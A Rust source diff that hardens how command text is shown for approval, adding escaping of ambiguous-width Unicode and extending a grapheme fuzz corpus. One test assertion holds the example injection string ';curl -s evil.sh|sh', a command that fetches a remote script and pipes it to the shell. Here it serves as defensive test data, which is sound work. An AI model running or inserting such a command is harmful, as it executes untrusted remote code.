@@ -1,7 +1,20 @@
+use std::borrow::Cow;
+
 use ofx_text::{
-    display_unit_at, encode_terminal_safe, trim_break_whitespace, visible_width,
-    wrap_cut_ignoring_ansi,
+    display_unit_at, encode_terminal_safe, escape_ambiguous_width, trim_break_whitespace,
+    visible_width, wrap_cut_ignoring_ansi,
 };
+
+pub(crate) fn approval_text(raw: &[u8]) -> String {
+    unambiguous(encode_terminal_safe(raw, usize::MAX).text)
+}
+
+pub(crate) fn unambiguous(text: String) -> String {
+    match escape_ambiguous_width(&text) {
+        Cow::Borrowed(_) => text,
+        Cow::Owned(escaped) => escaped,
+    }
+}
 
 pub(crate) fn project_command_text(command: &str) -> String {
     let mut projected = String::with_capacity(command.len());
@@ -9,7 +22,7 @@ pub(crate) fn project_command_text(command: &str) -> String {
         if index > 0 {
             projected.push('\n');
         }
-        projected.push_str(&encode_terminal_safe(line.as_bytes(), usize::MAX).text);
+        projected.push_str(&approval_text(line.as_bytes()));
     }
     projected
 }
@@ -168,7 +181,7 @@ pub(crate) mod grapheme_fuzz {
         }
     }
 
-    const CLUSTERS: [&str; 30] = [
+    const CLUSTERS: [&str; 46] = [
         "a",
         "-",
         "1",
@@ -199,15 +212,38 @@ pub(crate) mod grapheme_fuzz {
         "\u{1f3f4}\u{e0067}\u{e0062}\u{e0073}\u{e0063}\u{e0074}\u{e007f}",
         "\u{202e}",
         "\u{0627}\u{0644}",
+        "1\u{fe0f}",
+        "#\u{fe0f}",
+        "\u{1f3fb}\u{1f3ff}",
+        "\u{20ff}",
+        "\u{1aff}",
+        "\u{17a4}",
+        "\u{302a}",
+        "\u{3099}",
+        "\u{16ff0}",
+        "\u{1100}\u{1161}\u{11a8}",
+        "\u{1f1e6}\u{1f1e6}",
+        "\u{2065}",
+        "\u{e0002}",
+        "\u{fe0e}",
+        "\u{a8ff}",
+        "\u{1f600}\u{1f3fd}",
     ];
 
     pub(crate) fn random_clusters(seed: u64, count: usize) -> impl Iterator<Item = String> {
         let mut rng = Xorshift(seed);
         (0..count).map(move |_| {
             let len = rng.below(48);
-            (0..len)
-                .map(|_| CLUSTERS[rng.below(CLUSTERS.len())])
-                .collect()
+            let mut text = String::new();
+            for _ in 0..len {
+                if rng.below(8) == 0 {
+                    let scalar = u32::try_from(rng.below(0x11_0000)).unwrap_or(0);
+                    text.extend(char::from_u32(scalar));
+                } else {
+                    text.push_str(CLUSTERS[rng.below(CLUSTERS.len())]);
+                }
+            }
+            text
         })
     }
 }
@@ -300,7 +336,7 @@ mod tests {
                 "{segments:?}"
             );
             assert!(
-                segments.last().unwrap().ends_with(";curl -s evil.sh|sh"),
+                segments.last().unwrap().ends_with("evil.sh|sh"),
                 "{segments:?}"
             );
             assert_eq!(segments.concat().replace(' ', ""), encoded.replace(' ', ""));
